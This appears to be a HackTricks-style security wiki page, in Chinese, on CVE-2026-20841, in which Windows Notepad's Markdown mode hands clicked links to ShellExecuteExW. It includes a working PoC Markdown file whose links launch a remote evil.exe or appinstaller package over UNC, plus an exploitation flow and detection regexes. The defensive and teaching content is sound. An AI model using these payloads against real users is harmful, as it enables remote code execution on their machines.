# Windows Protocol Handler / ShellExecute 滥用（Markdown 渲染器）

{{#include ../banners/hacktricks-training.md}}

渲染 Markdown 或 HTML 的 Windows 应用可能会将点击的目标交给 `ShellExecuteExW`。由于 ShellExecute 会分派已注册的 URI schemes 和文件关联，渲染器需要使用明确的 allowlist，而不能假定每个链接都是 HTTP(S)。下面描述的 Notepad 行为对应 CVE-2026-20841，不应将其泛化到所有渲染器。<sup>[[1]](#references)[[3]](#references)</sup>

## Windows Notepad Markdown 模式中的 ShellExecuteExW 攻击面
- Notepad 仅通过 `sub_1400ED5D0()` 中的固定字符串比较，为 **`.md` 扩展名**选择 Markdown 模式。<sup>[[1]](#references)</sup>
- 支持的 Markdown links：
- 标准形式：`[text](target)`
- Autolink：`<target>`（渲染为 `[target](target)`），因此两种语法都需要纳入 payload 和检测范围。
- Link 点击由 `sub_140170F60()` 处理，该函数会执行弱过滤，然后调用 `ShellExecuteExW`。
- `ShellExecuteExW` 会分派到**任何已配置的 protocol handler**，而不仅仅是 HTTP(S)。<sup>[[1]](#references)</sup>

### Payload 注意事项
- Link 中的任何 `\\` 序列都会在调用 `ShellExecuteExW` **之前被规范化为 `\`**，这会影响 UNC/path 构造和检测。
- `.md` 文件**默认不会与 Notepad 关联**；victim 仍必须在 Notepad 中打开文件并点击 link，但文件渲染后，该 link 可以点击。
- 危险的示例 schemes：<sup>[[1]](#references)</sup>
- `file://`：用于启动本地/UNC payload。
- `ms-appinstaller://`：用于触发 App Installer 流程。其他在本地注册的 schemes 也可能被滥用。

### 最小 PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Exploitation flow
1. 构造一个 **`.md` 文件**，使 Notepad 将其渲染为 Markdown。
2. 使用危险的 URI scheme（`file:`、`ms-appinstaller:` 或任何已安装的 handler）嵌入链接。
3. 通过 HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB 或类似方式传送该文件，并诱使用户在 Notepad 中打开它。
4. 用户点击后，**normalized link** 会被交给 `ShellExecuteExW`，相应的 protocol handler 会在用户上下文中执行所引用的内容。<sup>[[1]](#references)[[2]](#references)</sup>

## Detection ideas
- 监控通过通常用于传送文档的端口/协议传输的 `.md` 文件：`20/21 (FTP)`、`80 (HTTP)`、`443 (HTTPS)`、`110 (POP3)`、`143 (IMAP)`、`25/587 (SMTP)`、`139/445 (SMB/CIFS)`、`2049 (NFS)`、`111 (portmap)`。
- 解析 Markdown 链接（标准链接和 autolink），并查找**不区分大小写**的 `file:` 或 `ms-appinstaller:`。
- 用于捕获远程资源访问的 Vendor-guided regexes：
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- ZDI 描述的 vendor fix 将可接受的目标限制为本地文件和 HTTP(S)。请根据需要将检测范围扩展到其他已安装的 protocol handlers，因为每个系统中注册的攻击面各不相同。<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841：Windows Notepad 中的任意代码执行](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
